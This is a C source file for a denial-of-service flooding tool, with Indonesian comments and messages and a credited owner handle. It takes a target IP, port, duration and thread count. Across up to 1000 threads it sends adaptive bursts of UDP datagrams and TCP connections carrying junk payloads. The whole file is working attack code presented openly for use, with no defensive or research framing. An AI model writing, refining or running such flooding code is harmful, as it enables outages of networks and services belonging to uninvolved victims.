
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>

#define MAX_THREADS 1000
#define MAX_BURST 100

int running = 1;
char *target_ip;
int target_port;
int duration;
int max_threads;
int burst = MAX_BURST;
size_t payload_size = 512;

void stop_attack(int sig) {
    running = 0;
    printf("\n[*] Serangan dihentikan oleh pengguna.\n");
}

void *flood_thread(void *arg) {
    int sock;
    struct sockaddr_in server;
    char *payload = malloc(payload_size);
    memset(payload, 'A', payload_size);

    server.sin_family = AF_INET;
    server.sin_port = htons(target_port);
    server.sin_addr.s_addr = inet_addr(target_ip);

    time_t start = time(NULL);

    while (running && time(NULL) - start < duration) {
        for (int i = 0; i < burst; i++) {
            if (rand() % 2) {  // UDP
                sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                sendto(sock, payload, payload_size, 0, (struct sockaddr *)&server, sizeof(server));
            } else {  // TCP
                sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (connect(sock, (struct sockaddr *)&server, sizeof(server)) >= 0) {
                    send(sock, payload, payload_size, 0);
                } else {
                    if (burst > 10) burst--; // adaptif turunin burst
                    if (payload_size > 128) payload_size -= 128;
                }
            }
            close(sock);
        }

        // adaptif naikkin burst & payload size
        if (burst < MAX_BURST) burst++;
        if (payload_size < 4096) payload_size += 128;
        usleep(10000);
    }

    free(payload);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 6 || strcmp(argv[5], "stx") != 0) {
        printf("Usage: %s <ip> <port> <duration> <threads> stx\n", argv[0]);
        return 1;
    }

    signal(SIGINT, stop_attack);

    target_ip = argv[1];
    target_port = atoi(argv[2]);
    duration = atoi(argv[3]);
    max_threads = atoi(argv[4]);
    if (max_threads > MAX_THREADS) max_threads = MAX_THREADS;

    printf("[*] Serangan dimulai ke %s:%d selama %d detik dengan %d thread\n", target_ip, target_port, duration, max_threads);
    printf("[*] Pemilik: @kecee_pyrite\n");

    pthread_t threads[MAX_THREADS];
    for (int i = 0; i < max_threads; i++) {
        pthread_create(&threads[i], NULL, flood_thread, NULL);
    }

    for (int i = 0; i < max_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("[*] Serangan selesai.\n");
    return 0;
}
